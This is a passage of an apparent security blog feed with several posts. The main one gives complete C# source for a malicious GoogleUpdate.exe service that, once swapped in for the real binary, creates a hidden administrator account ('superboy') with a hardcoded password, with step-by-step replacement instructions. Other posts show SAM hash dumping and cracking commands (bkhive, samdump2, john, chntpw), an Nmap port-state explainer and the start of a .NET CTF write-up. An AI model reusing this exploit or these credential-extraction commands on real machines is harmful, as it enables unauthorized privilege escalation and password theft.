&lt;li&gt;&lt;a href='http://msdn.microsoft.com/en-us/library/ms684272.aspx'&gt;NetworkService&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;a href='http://msdn.microsoft.com/en-us/library/ms684190.aspx'&gt;LocalSystem&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;LocalSystem has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY\SYSTEM and BUILTIN\Administrators SIDs; these accounts have access to most system objects.&lt;/p&gt;

&lt;p&gt;If you open &lt;em&gt;services.msc&lt;/em&gt; you can see many Windows services running with &lt;strong&gt;LocalSystem&lt;/strong&gt; account. Most of the Windows services run under the process svchost.exe by supplying different command line parameters to it. Now imagine what will happen if we replace svchost.exe with our own custom &lt;em&gt;svchost.exe&lt;/em&gt; having malicious code. This file replacement will result in privelege escalation and execution of exploit code. This can even happen remotely if you are able to connect to remote machine and replace &lt;em&gt;svchost.exe&lt;/em&gt;. Fortunately, &lt;em&gt;svchost.exe&lt;/em&gt; and many of the Windows critical executables are protected by &lt;a href='http://en.wikipedia.org/wiki/Windows_File_Protection'&gt;Windows File Protection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/services.png' /&gt;&lt;/p&gt;

&lt;p&gt;However, depending on your computer configuration, there will be some other 3rd party services which have been installed and run under the different process. For example, in the screenshot below there is a service called &lt;strong&gt;Google Update service&lt;/strong&gt; which runs under LocalSystem account in the process &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt;. This process is generally called from this location &lt;strong&gt;C:\Program Files\Google\GoogleUpdate.exe&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/gpupdate.png' /&gt;&lt;/p&gt;

&lt;p&gt;Now, even as a restricted user, nobody is stopping me from deleting or replacing this file. If we replace this &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt; with the malicious one and then restart the Google Update Services, no file integrity check is performed by OS or Google Update Services to verify that file being executed is original or malicious. This makes the system vulnerable to be exploited since we can run any malicious code under System account simply by replacing this file and then executing the service, which can be done as restricted user.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/gservice.png' /&gt;&lt;/p&gt;

&lt;p&gt;Here is a simple Windows Service code which produces the executable called &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt; , creates a user and adds it to the Administrators group.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt;&lt;span class='k'&gt;namespace&lt;/span&gt; &lt;span class='nn'&gt;Google.MakeAdmin.Exploit&lt;/span&gt;
&lt;span class='p'&gt;{&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System.Diagnostics&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System.ServiceProcess&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
    &lt;span class='k'&gt;using&lt;/span&gt; &lt;span class='nn'&gt;System.DirectoryServices&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

    &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='k'&gt;partial&lt;/span&gt; &lt;span class='k'&gt;class&lt;/span&gt; &lt;span class='nc'&gt;MakeAdmin&lt;/span&gt; &lt;span class='p'&gt;:&lt;/span&gt; &lt;span class='n'&gt;ServiceBase&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;readonly&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;readonly&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;sLog&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;        

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// Initializes a new instance of the &amp;lt;see cref=&amp;quot;MakeAdmin&amp;quot;/&amp;gt; class.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;public&lt;/span&gt; &lt;span class='nf'&gt;MakeAdmin&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
            &lt;span class='n'&gt;InitializeComponent&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;
            &lt;span class='n'&gt;sSource&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Google.MakeAdmin.Exploit&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
            &lt;span class='n'&gt;sLog&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Application&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
        &lt;span class='p'&gt;}&lt;/span&gt;

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// When implemented in a derived class, executes when a Start command is sent to the service by the &lt;/span&gt;
        &lt;span class='c1'&gt;/// Service Control Manager (SCM) or when the operating system starts (for a service that starts automatically). &lt;/span&gt;
        &lt;span class='c1'&gt;/// Specifies actions to take when the service starts.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;args&amp;quot;&amp;gt;Data passed by the start command.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;protected&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;OnStart&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;string&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='n'&gt;args&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
            &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(!&lt;/span&gt;&lt;span class='n'&gt;EventLog&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;SourceExists&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;))&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;EventLog&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;CreateEventSource&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;sLog&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
            &lt;span class='p'&gt;}&lt;/span&gt;


            &lt;span class='k'&gt;const&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;login&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;superboy&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
            &lt;span class='k'&gt;const&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;pass@word1&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
            &lt;span class='k'&gt;const&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;fullName&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;Clark Kent&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;

            &lt;span class='n'&gt;CreateUserAccount&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;fullName&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;true&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;

        &lt;span class='p'&gt;}&lt;/span&gt;

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// When implemented in a derived class, executes when a Stop command is sent to the service by the &lt;/span&gt;
        &lt;span class='c1'&gt;/// Service Control Manager (SCM). Specifies actions to take when a service stops running.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;protected&lt;/span&gt; &lt;span class='k'&gt;override&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;OnStop&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
        &lt;span class='p'&gt;}&lt;/span&gt;

        &lt;span class='c1'&gt;/// &amp;lt;summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// Creates the user account.&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;/summary&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;login&amp;quot;&amp;gt;The login.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;password&amp;quot;&amp;gt;The password.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;fullName&amp;quot;&amp;gt;The full name.&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;isAdmin&amp;quot;&amp;gt;if set to &amp;lt;c&amp;gt;true&amp;lt;/c&amp;gt; [is admin].&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='c1'&gt;/// &amp;lt;param name=&amp;quot;isNew&amp;quot;&amp;gt;if set to &amp;lt;c&amp;gt;true&amp;lt;/c&amp;gt; [is new].&amp;lt;/param&amp;gt;&lt;/span&gt;
        &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;CreateUserAccount&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;string&lt;/span&gt; &lt;span class='n'&gt;fullName&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='n'&gt;isAdmin&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='kt'&gt;bool&lt;/span&gt; &lt;span class='n'&gt;isNew&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
        &lt;span class='p'&gt;{&lt;/span&gt;
            &lt;span class='k'&gt;try&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;WinNT://&amp;quot;&lt;/span&gt; &lt;span class='p'&gt;+&lt;/span&gt; &lt;span class='n'&gt;Environment&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;MachineName&lt;/span&gt; &lt;span class='p'&gt;+&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;,computer&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntries&lt;/span&gt; &lt;span class='n'&gt;entries&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Children&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt; &lt;span class='n'&gt;newUser&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='k'&gt;null&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
                &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;isNew&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;newUser&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;entries&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Add&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='k'&gt;else&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;newUser&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;entries&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;login&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;user&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;

                &lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Properties&lt;/span&gt;&lt;span class='p'&gt;[&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;FullName&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;].&lt;/span&gt;&lt;span class='n'&gt;Add&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;fullName&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Invoke&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;SetPassword&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;password&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                &lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;CommitChanges&lt;/span&gt;&lt;span class='p'&gt;();&lt;/span&gt;

                &lt;span class='c1'&gt;// Remove the if condition along with the else to create user account in &amp;quot;user&amp;quot; group.&lt;/span&gt;
                &lt;span class='n'&gt;DirectoryEntry&lt;/span&gt; &lt;span class='n'&gt;grp&lt;/span&gt;&lt;span class='p'&gt;;&lt;/span&gt;
                &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;isAdmin&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Children&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Administrators&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;group&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                    &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;!=&lt;/span&gt; &lt;span class='k'&gt;null&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                    &lt;span class='p'&gt;{&lt;/span&gt;
                        &lt;span class='n'&gt;grp&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Invoke&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Add&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='kt'&gt;object&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt;&lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Path&lt;/span&gt;&lt;span class='p'&gt;});&lt;/span&gt;
                    &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='k'&gt;else&lt;/span&gt;
                &lt;span class='p'&gt;{&lt;/span&gt;
                    &lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;=&lt;/span&gt; &lt;span class='n'&gt;dirEntry&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Children&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Find&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Guests&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='s'&gt;&amp;quot;group&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
                    &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;grp&lt;/span&gt; &lt;span class='p'&gt;!=&lt;/span&gt; &lt;span class='k'&gt;null&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
                    &lt;span class='p'&gt;{&lt;/span&gt;
                        &lt;span class='n'&gt;grp&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Invoke&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='s'&gt;&amp;quot;Add&amp;quot;&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='k'&gt;new&lt;/span&gt; &lt;span class='kt'&gt;object&lt;/span&gt;&lt;span class='p'&gt;[]&lt;/span&gt; &lt;span class='p'&gt;{&lt;/span&gt;&lt;span class='n'&gt;newUser&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Path&lt;/span&gt;&lt;span class='p'&gt;});&lt;/span&gt;
                    &lt;span class='p'&gt;}&lt;/span&gt;
                &lt;span class='p'&gt;}&lt;/span&gt;

            &lt;span class='p'&gt;}&lt;/span&gt;
            &lt;span class='k'&gt;catch&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;Exception&lt;/span&gt; &lt;span class='n'&gt;ex&lt;/span&gt;&lt;span class='p'&gt;)&lt;/span&gt;
            &lt;span class='p'&gt;{&lt;/span&gt;
                &lt;span class='n'&gt;EventLog&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;WriteEntry&lt;/span&gt;&lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='n'&gt;sSource&lt;/span&gt;&lt;span class='p'&gt;,&lt;/span&gt; &lt;span class='n'&gt;ex&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;Message&lt;/span&gt;&lt;span class='p'&gt;);&lt;/span&gt;
            &lt;span class='p'&gt;}&lt;/span&gt;
        &lt;span class='p'&gt;}&lt;/span&gt;
    &lt;span class='p'&gt;}&lt;/span&gt;
&lt;span class='p'&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;h2 id='exploiting_the_service_running_with_localsystem_account'&gt;Exploiting the Service running with LocalSystem Account&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;Compile the file to generate a new service executable named &lt;strong&gt;GoogleUpdate.exe&lt;/strong&gt; and replace it with the original file stored at the location &lt;strong&gt;C:\Program Files\Google\GoogleUpdate.exe&lt;/strong&gt;&lt;/li&gt;

&lt;li&gt;Restart the service. This will cause our exploit code to be executed and a new user will be created in the system with Administrator privileges. In my example, user will have login name &lt;em&gt;superboy&lt;/em&gt; and password &lt;em&gt;pass@word1&lt;/em&gt;.&lt;/li&gt;

&lt;li&gt;Try to run the command prompt with the credentials of new user. &lt;img alt='' src='/images/Blog/runcmd.png' /&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img alt='' src='/images/Blog/login.png' /&gt;&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;The command prompt executed is under the credentials of superboy and has superuser access.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The exploit code can be downloaded from &lt;a href='https://github.com/madhur/Google.MakeAdmin.Exploit'&gt;this&lt;/a&gt; github repository.&lt;/p&gt;</content>
 </entry>
 
 <entry>
   <title>Difference between Filtered vs Closed Ports</title>
   <link href="http://madhur.co.in/blog/2011/09/18/filteredclosed.html"/>
   <updated>2011-09-18T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/18/filteredclosed</id>
   <content type="html">&lt;p&gt;Often during Nmap scanning techniques, you will find the port state as either &lt;strong&gt;open&lt;/strong&gt; or &lt;strong&gt;filtered&lt;/strong&gt;&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;PORT      STATE    SERVICE
22/tcp    open     ssh
443/tcp   open     https
1024/tcp  filtered kdm
1084/tcp  filtered ansoft-lm-2
1863/tcp  filtered msnp
3128/tcp  open     squid-http
3333/tcp  filtered dec-notes
4900/tcp  filtered hfcs
9943/tcp  filtered unknown
30000/tcp open     unknown
38292/tcp filtered landesk-cba
40911/tcp filtered unknown
52673/tcp filtered unknown
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;What exactly is the difference between two ?&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Closed Port&lt;/strong&gt;: If you send a SYN to a closed port, it will respond back with a RST.&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;Filtered Port&lt;/strong&gt;: Presumably, the host is behind some sort of firewall. Here, the packet is simply dropped and you receive no response (not even a RST).&lt;/li&gt;

&lt;li&gt;&lt;strong&gt;Open Port&lt;/strong&gt;: If you send a SYN to an open port, you would expect to receive SYN/ACK.&lt;/li&gt;
&lt;/ul&gt;</content>
 </entry>
 
 <entry>
   <title>Crack or Reset Windows Passwords</title>
   <link href="http://madhur.co.in/blog/2011/09/18/crackresetwindows.html"/>
   <updated>2011-09-18T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/18/crackresetwindows</id>
   <content type="html">&lt;p&gt;If you have forgotten the Windows Administrator password, you can either reset or even crack it. Windows XP stored it username and password information in file named SAM at %SystemDrive%:\Windows\system32\config. The SAM file is encrypted using LM hashes, which is vulnerable to rainbow table attack and bruteforce attack.&lt;/p&gt;

&lt;p&gt;I am going to do this with already available tools in Backtrack.&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;cd /mnt/hda1/WINDOWS/system32/config/
bkhive system key
samdump2 SAM key &amp;gt; /root/pass1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;This will dump the hashes in /root/pass1 file as shown below&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;Root Key : CMI-CreateHive{C4E7BA2B-68E8-499C-B1A1-371AC8D717C7}
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
madhurdesk:1000:aad3b435b51404eeaad3b435b51404ee:ba03a114def8d5c913983436960e592c:::
HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:cdaac87aeeac96724b4a2af3c4879242:::
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Cracking using John the ripper,&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;john --format=NT /root/pass1
Loaded 1 password hash (NT MD4 [128/128 SSE2 + 32/32])
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;Or, you can directly reset it with chntpw&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='text'&gt;/pentest/password/chntpw -u administrator SAM
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;</content>
 </entry>
 
 <entry>
   <title>HackingLab Challenge: Disassemble .NET Clients</title>
   <link href="http://madhur.co.in/blog/2011/09/10/hackchallenge.html"/>
   <updated>2011-09-10T00:00:00+05:30</updated>
   <id>id:/blog/2011/09/10/hackchallenge</id>
   <content type="html">&lt;p&gt;Compass Security has come up with a hacking challenge on their &lt;a href='https://www.hacking-lab.com/sh/LAE04Jf'&gt;site&lt;/a&gt;. The challenge consist of an .NET client having some hidden functionality which needs to be uncovered by the user. I decided to give it a try.&lt;/p&gt;

&lt;h2 id='requirements'&gt;Requirements&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;Download &lt;a href='http://media.hacking-lab.com/largefiles/7205/DotNetFatClientHacking.exe'&gt;Application: DotNetFatClientHacking.exe&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='tools_used_in_the_trade'&gt;Tools used in the trade&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href='http://www.reflector.net/'&gt;Reflector&lt;/a&gt; or now better &lt;a href='http://www.jetbrains.com/decompiler/'&gt;DotPeek&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;ILDasm&lt;/li&gt;

&lt;li&gt;Hex Editor&lt;/li&gt;

&lt;li&gt;MSDN&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id='solution'&gt;Solution&lt;/h2&gt;

&lt;p&gt;Let&amp;#8217;s run our .NET assembly and see what it looks like. Its a normal Windows Form application with just one button which does nothing. I could not figure out anything else from the application.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/netapp.png' /&gt;&lt;/p&gt;

&lt;p&gt;Let&amp;#8217;s open the assembly in Reflector and see what it&amp;#8217;s doing.&lt;/p&gt;

&lt;p&gt;&lt;img alt='' src='/images/reflector.png' /&gt;&lt;/p&gt;

&lt;p&gt;From the reflector, I could figure out the following&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The form has got actually 3 buttons, 2 are hidden&lt;/li&gt;

&lt;li&gt;There is a &lt;em&gt;BusinessClass&lt;/em&gt; class in the assembly which is invoked by the hidden buttons&lt;/li&gt;

&lt;li&gt;The visible button checks if the user is &lt;em&gt;Admin&lt;/em&gt; and hides or shows the other two buttons&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Now, our job is to become the Admin :) . That&amp;#8217;s the code which is called by the Visible button &lt;strong&gt;Identify me&lt;/strong&gt;&lt;/p&gt;
&lt;div class='highlight'&gt;&lt;pre&gt;&lt;code class='csharp'&gt; &lt;span class='k'&gt;private&lt;/span&gt; &lt;span class='k'&gt;void&lt;/span&gt; &lt;span class='nf'&gt;identifyUser&lt;/span&gt;&lt;span class='p'&gt;()&lt;/span&gt;
    &lt;span class='p'&gt;{&lt;/span&gt;
      &lt;span class='k'&gt;if&lt;/span&gt; &lt;span class='p'&gt;(&lt;/span&gt;&lt;span class='k'&gt;this&lt;/span&gt;&lt;span class='p'&gt;.&lt;/span&gt;&lt;span class='n'&gt;IsAdmin&lt;/span&gt;&lt;span class='p'&gt;())&lt;/span&gt;
      &lt;span class='p'&gt;{&lt;/span&gt;
